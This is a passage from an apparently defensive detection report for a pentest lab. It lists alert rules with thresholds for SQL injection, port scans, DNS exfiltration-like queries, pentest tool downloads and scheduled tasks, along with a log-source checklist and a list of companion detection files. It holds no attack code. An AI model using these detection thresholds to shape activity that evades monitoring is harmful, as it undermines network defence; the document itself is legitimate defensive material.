| P2 | SQL injection attempt | Snort / WAF | SQL syntax in HTTP parameters |
| P3 | Port scan detected | Snort / Zeek | >100 SYN packets to distinct ports in <60s |
| P3 | Suspicious DNS activity | Zeek dns.log | Domain labels >30 chars or >100 queries/min to single domain |
| P3 | Tool download detected | Zeek http.log / Snort | Known pentest tool filenames in HTTP responses |
| P3 | Scheduled task created | Windows Security 4698 | Any new scheduled task with SYSTEM context |

### 5.4 Log Sources Checklist

| Log Source | Host | Path/Config | Ships To |
|------------|------|-------------|----------|
| auth.log | Ubuntu .102 | /var/log/auth.log | OSSEC -> SIEM |
| syslog | Ubuntu .102 | /var/log/syslog | OSSEC -> SIEM |
| Apache access log | Ubuntu .102 | /var/log/apache2/access.log | OSSEC -> SIEM |
| Apache error log | Ubuntu .102 | /var/log/apache2/error.log | OSSEC -> SIEM |
| MySQL error log | Ubuntu .102 | /var/log/mysql/error.log | OSSEC -> SIEM |
| auditd | Ubuntu .102 | /var/log/audit/audit.log | OSSEC -> SIEM |
| cron log | Ubuntu .102 | /var/log/cron.log | OSSEC -> SIEM |
| Windows Security | Windows .101 | Event Log | Winlogbeat -> SIEM |
| Windows System | Windows .101 | Event Log | Winlogbeat -> SIEM |
| Sysmon | Windows .101 | Event Log (Microsoft-Windows-Sysmon) | Winlogbeat -> SIEM |
| PowerShell | Windows .101 | Event Log (Microsoft-Windows-PowerShell) | Winlogbeat -> SIEM |
| Zeek logs | Sec Onion .110 | /nsm/zeek/logs/current/ | Local ELK |
| Snort/Suricata alerts | Sec Onion .110 | /nsm/suricata/ | Local ELK |

---

## Companion Detection Files

The following tool-specific detection files are in this directory:

| File | Description |
|------|-------------|
| `snort-detections.md` | Snort/Suricata rules for each attack phase |
| `splunk-detections.md` | SPL queries, correlation searches, and alerts |
| `zeek-detections.md` | Zeek scripts and log analysis queries |
| `ossec-detections.md` | OSSEC rules, FIM config, and active response |
| `wireshark-detections.md` | Display filters and capture filters per attack phase |
| `yara-detections.md` | YARA rules for tool/payload detection |
| `velociraptor-detections.md` | VQL artifacts and hunt queries |
| `security-onion-detections.md` | Security Onion integration and dashboard config |
| `nmap-detections.md` | Defensive nmap usage for baseline and change detection |
| `elk-detections.md` | Elasticsearch queries, Kibana dashboards, Logstash filters |
| `cuckoo-detections.md` | Sandbox signatures for payload analysis |
| `psaa-detections.md` | PowerShell auditing, Script Block Logging detections |
| `soc-log-cheatsheet-detections.md` | Quick-reference SOC log correlation guide |

---

*Report generated from Phase 2A analysis of 118 attack steps across 8 pentest lab modules.*
*Network: 192.168.56.0/24 | Kali: .103 | Ubuntu: .102 | Windows: .101*
